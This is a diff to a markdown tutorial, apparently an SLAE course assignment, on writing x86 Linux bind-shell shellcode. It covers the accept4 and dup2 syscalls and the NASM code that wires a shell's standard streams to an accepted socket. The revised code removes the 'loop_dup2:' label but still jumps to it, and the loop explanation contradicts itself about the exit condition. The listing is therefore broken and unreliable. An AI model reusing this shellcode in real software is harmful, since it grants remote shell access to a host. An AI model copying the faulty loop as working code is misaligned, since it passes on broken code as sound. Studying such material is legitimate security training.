@@ -411,12 +411,12 @@ The ECX memory register is then cleared, the  program interrupt is called and th
 #### 4th Syscall (Accept Incoming Connections)
 ----
 
+The accept4 syscall begins with its code value of 364, converting from decimal to hex equals 0x16c:
+
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep accept
 #define __NR_accept4 364
 ```
-
-The accept4 syscall begins with its code value of 364, converting from decimal to hex equals 0x16c.
 
 The EAX register is cleared to store the accept4 syscall value into the lower memory region:
 
@@ -506,26 +506,32 @@ The RETURN VALUE defined in the man pages for accept4 describes a new sockfd val
 
 The dup2 syscall works by creating a loop and iterating 3 times to accomodate all 3 file descriptors loading into the accepted connection (providing an interactive bind shell session).
 
-Carry on here ... syscall code of 63 (0x3f):
+To redirect IO to the descriptor, a loop is initiated with the ECX register, commonly known as the counter register. 
+
+The syscall code can be found in the header file below, converting 63 from decimal to hex equals 0x3f:
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2 
 #define __NR_dup2 63
 ```
 
-... code 
+The dup2 syscall code of 63 is moved in the lower part of the EAX memory region.
+
+All required arguments of dup2 are in sockfd (stored in accept syscall), which will be moved to EDI.
+
+Whilst the zero flag is not set (JNZ) - the counter register is decremented each time within the loop. Once the value of '-1' gets set in ECX, the signed flag will be set and the loop is broken (exits when $exc equals 0):
+
+5th syscall (Assembly code section):
 
 ```nasm
-	mov cl, 0x3     ; putting 3 in the counter
-    
-    	loop_dup2:      
+	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR 
+	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)     
  	xor eax, eax   
-   	mov al, 0x3f    ; putting the syscall code into the lower part of eax
-   	mov ebx, edi    ; putting our new int sockfd into ebx
-   	dec cl          ; decrementing cl by one
-   	int 0x80
-    
-    	jnz loop_dup2   ; jumping back to the top of loop_dup2 if the zero flag is not set
+   	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
+   	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
+   	dec cl          ; decrement cl by 1
+   	int 0x80	; call interrupt to execute dup2 syscall
+    	jnz loop_dup2   ; jump back to the top of loop_dup2 if the zero flag is not set
 ```
 
 #### Assembly Code
@@ -580,6 +586,15 @@ _start:
 	int 0x80	; call the interrupt to execute accept syscall
 	xor edi, edi    ; zeroize socket value stored in edi
 	mov edi, eax    ; save return value from eax into edi	
+	
+	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR 
+	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)     
+ 	xor eax, eax   
+   	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
+   	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
+   	dec cl          ; decrement cl by 1
+   	int 0x80	; call interrupt to execute dup2 syscall
+    	jnz loop_dup2   ; jump back to the top of loop_dup2 if the zero flag is not set
 ````
 
 ##### SLAE Disclaimer ####
